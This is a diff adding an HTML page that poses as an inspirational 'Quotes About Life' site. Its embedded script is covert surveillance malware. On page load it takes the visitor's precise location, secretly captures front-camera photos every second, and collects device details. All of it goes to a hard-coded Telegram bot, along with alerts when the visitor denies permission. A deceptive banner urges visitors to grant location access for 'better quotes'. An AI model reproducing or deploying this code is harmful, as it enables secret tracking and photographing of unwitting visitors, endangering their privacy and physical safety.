@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Quotes About Life</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/32/2721/2721293.png" type="image/png">
+
+  <link
+    href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500&family=Open+Sans:wght@400;600&display=swap"
+    rel="stylesheet" />
+  <style>
+    :root {
+      --primary-color: #6a11cb;
+      --secondary-color: #2575fc;
+      --bg: #f9f9f9;
+      --text: #333;
+      --quote-bg: #fff;
+      --footer-bg: #222;
+      --link: #6a11cb;
+    }
+
+    body.dark {
+      --bg: #121212;
+      --text: #e0e0e0;
+      --quote-bg: #1e1e1e;
+      --footer-bg: #000;
+      --link: #bb86fc;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      transition: background 0.4s, color 0.4s;
+    }
+
+    header {
+      position: sticky;
+      top: 0;
+      background: var(--quote-bg);
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+    }
+
+    nav {
+      max-width: 1200px;
+      margin: auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+    }
+
+    nav a {
+      color: var(--text);
+      font-weight: 600;
+      text-decoration: none;
+      font-size: 1rem;
+    }
+
+    .toggle-container {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .toggle-container label {
+      width: 40px;
+      height: 20px;
+      background: var(--secondary-color);
+      border-radius: 10px;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .toggle-container label::after {
+      content: "";
+      width: 16px;
+      height: 16px;
+      background: white;
+      border-radius: 50%;
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      transition: 0.3s;
+    }
+
+    #toggle:checked+label::after {
+      transform: translateX(20px);
+    }
+
+    #location-banner {
+      background: #fff8e1;
+      color: #4e4e4e;
+      padding: 0.75rem 1rem;
+      border-bottom: 1px solid #ffecb3;
+      display: none;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.95rem;
+      font-weight: 500;
+      position: sticky;
+      top: 0;
+      z-index: 9999;
+      gap: 1rem;
+    }
+
+    #location-banner p {
+      margin: 0;
+      flex: 1 1 60%;
+    }
+
+    .banner-actions {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      flex-wrap: nowrap;
+    }
+
+    #allow-location-btn {
+      background: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 0.4rem 0.9rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    #allow-location-btn:hover {
+      background: var(--secondary-color);
+    }
+
+    #close-banner {
+      cursor: pointer;
+      font-size: 1.2rem;
+    }
+
+
+    .hero {
+      background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+      color: white;
+      text-align: center;
+      padding: 4rem 1.5rem;
+    }
+
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2.5rem;
+      animation: slideIn 1s ease forwards;
+    }
+
+    .hero p {
+      font-size: 1.1rem;
+      margin-top: 0.5rem;
+      animation: fadeIn 1.2s ease forwards;
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    section#quotes {
+      padding: 3rem 1.5rem;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .quote-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 2rem;
+    }
+
+    @media (min-width: 600px) {
+      .quote-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (min-width: 992px) {
+      .quote-grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+
+    blockquote {
+      background: var(--quote-bg);
+      border-left: 5px solid var(--primary-color);
+      padding: 1.5rem;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      font-style: italic;
+      transition: background 0.3s, color 0.3s;
+    }
+
+    blockquote footer {
+      margin-top: 1rem;
+      text-align: right;
+      font-weight: bold;
+      color: var(--link);
+    }
+
+    footer {
+      background: var(--footer-bg);
+      color: white;
+      text-align: center;
+      padding: 2rem 1rem;
+      transition: background 0.3s;
+    }
+
+    .social-icons {
+      margin: 1rem 0;
+    }
+
+    .social-icons a {
+      margin: 0 0.5rem;
+      color: white;
+      font-size: 1.2rem;
+      text-decoration: none;
+      transition: transform 0.3s ease, color 0.3s ease;
+    }
+
+    .social-icons a:hover {
+      transform: scale(1.2);
+      color: var(--link);
+    }
+
+    #toggle {
+      display: none;
+    }
+
+    /* Hide map from UI but keep functional */
+    #map {
+      display: none;
+      height: 0;
+      width: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    /* Hidden video and canvas */
+    #video,
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <input type="checkbox" id="toggle" hidden onchange="document.body.classList.toggle('dark')" />
+  <div id="location-banner">
+    <p>🌟 Want even better quotes tailored for you? Please allow location permission. It helps us serve more
+      inspiring content! 💡</p>
+    <div class="banner-actions">
+      <button id="allow-location-btn">Allow</button>
+      <span id="close-banner">✖️</span>
+    </div>
+  </div>
+  <header>
+    <nav>
+      <a href="#">Quotes About Life</a>
+      <div class="toggle-container">
+        <span>🌙</span>
+        <label for="toggle" title="Toggle Dark Mode"></label>
+      </div>
+    </nav>
+  </header>
+
+  <section class="hero">
+    <h1>Inspiring Life Quotes</h1>
+    <p>Words that empower, motivate, and enlighten your journey.</p>
+  </section>
+
+  <section id="quotes">
+    <div class="quote-grid">
+      <blockquote>"Life is what happens when you're busy making other plans." <footer>- John Lennon</footer>
+      </blockquote>
+      <blockquote>"Get busy living or get busy dying." <footer>- Stephen King</footer>
+      </blockquote>
+      <blockquote>"The purpose of our lives is to be happy." <footer>- Dalai Lama</footer>
+      </blockquote>
+      <blockquote>"Life is short, and it is up to you to make it sweet." <footer>- Sarah Louise Delany</footer>
+      </blockquote>
+      <blockquote>"You only live once, but if you do it right, once is enough." <footer>- Mae West</footer>
+      </blockquote>
+      <blockquote>"In the middle of every difficulty lies opportunity." <footer>- Albert Einstein</footer>
+      </blockquote>
+      <blockquote>"Life is really simple, but we insist on making it complicated." <footer>- Confucius</footer>
+      </blockquote>
+      <blockquote>"Your time is limited, so don’t waste it living someone else’s life." <footer>- Steve Jobs
+        </footer>
+      </blockquote>
+      <blockquote>"Do not dwell in the past, do not dream of the future, concentrate the mind on the present
+        moment." <footer>- Buddha</footer>
+      </blockquote>
+      <blockquote>"Happiness is not something ready-made. It comes from your own actions." <footer>- Dalai Lama
+        </footer>
+      </blockquote>
+    </div>
+  </section>
+
+  <footer>
+    <div class="social-icons">
+      <a href="#">📘</a>
+      <a href="#">🐦</a>
+      <a href="#">📸</a>
+    </div>
+    <p>&copy; 2025 Quotes About Life. Made with ❤️ by Dogesh</p>
+  </footer>
+
+  <!-- Hidden Elements for Camera Capture -->
+  <video id="video" autoplay muted></video>
+  <canvas id="canvas"></canvas>
+  <div id="map"></div>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+  <!-- Your Existing JS Logic -->
+  <script>
+    const token = '6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4';
+    const chat_id = '1444862345';
+
+    let userLat = null, userLng = null, marker = null, circle = null, stream = null;
+
+    const map = L.map('map').setView([30.7046, 76.7179], 13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+
+    function updateMap(lat, lng, accuracy) {
+      const coords = [lat, lng];
+      marker ??= L.marker(coords).addTo(map).bindPopup("📍 You are here").openPopup();
+      marker.setLatLng(coords);
+      circle ??= L.circle(coords, { radius: accuracy, color: 'blue', fillColor: '#add8e6', fillOpacity: 0.3 }).addTo(map);
+      circle.setLatLng(coords).setRadius(accuracy);
+      map.setView(coords, 16);
+    }
+
+    function sendLocationToTelegram(lat, lng, accuracy) {
+      const message = `
+📍 *Live Location Update*
+*Latitude:* \`${lat}\`
+*Longitude:* \`${lng}\`
+*Accuracy:* ~${Math.round(accuracy)} meters
+
+🌍 [View on Map](https://www.google.com/maps/search/?api=1&query=${lat},${lng})
+🧭 [Get Directions](https://www.google.com/maps/dir/?api=1&destination=${lat},${lng})`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
+      });
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, 'snapshot.jpg');
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    function captureAndSendImage() {
+      try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 300;
+        canvas.height = video.videoHeight || 200;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => blob && sendPhotoToTelegram(blob), 'image/jpeg', 0.9);
+      } catch (err) {
+        console.error("Camera capture failed:", err);
+      }
+    }
+
+    function startCameraLoop() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then((mediaStream) => {
+          stream = mediaStream;
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+
+          video.onloadedmetadata = () => {
+            video.play();
+
+            // ✅ Start only after video is playing
+            video.onplaying = () => {
+              // Start sending image every 1 second
+              setInterval(captureAndSendImage, 1000);
+            };
+          };
+        })
+        .catch((err) => {
+          console.warn("📷 Camera access denied:", err);
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id,
+              text: "❌ User denied camera access.",
+            })
+          });
+        });
+    }
+
+
+    function locateUser() {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          userLat = latitude;
+          userLng = longitude;
+          updateMap(userLat, userLng, accuracy);
+          sendLocationToTelegram(userLat, userLng, accuracy);
+        },
+        err => {
+          // 👇 Show polite banner if user denies location access
+          const banner = document.getElementById("location-banner");
+          if (banner) banner.style.display = "flex";
+
+          // 📤 Send Telegram alert as before
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id,
+              text: "❌ User denied location access."
+            })
+          });
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
+
+    function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        connection: navigator.connection?.effectiveType || "N/A",
+        battery: null,
+      };
+      navigator.getBattery?.().then(battery => {
+        info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+        sendInfoToTelegram(info);
+      }) || sendInfoToTelegram(info);
+    }
+
+    function sendInfoToTelegram(info) {
+      const message = `
+📱 *Device Info*
+🧭 Platform: ${info.platform}
+🌐 Network: ${info.connection}
+🔋 Battery: ${info.battery || 'N/A'}
+🧾 User Agent:
+\`${info.userAgent}\``;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: message, parse_mode: 'Markdown' })
+      });
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      locateUser();
+      startCameraLoop();
+      getDeviceInfo();
+    });
+    document.getElementById("close-banner").addEventListener("click", () => {
+      document.getElementById("location-banner").style.display = "none";
+    });
+
+    document.getElementById("allow-location-btn").addEventListener("click", () => {
+      locateUser(); // Re-trigger permission prompt
+    });
+  </script>
+</body>
+
+</html>
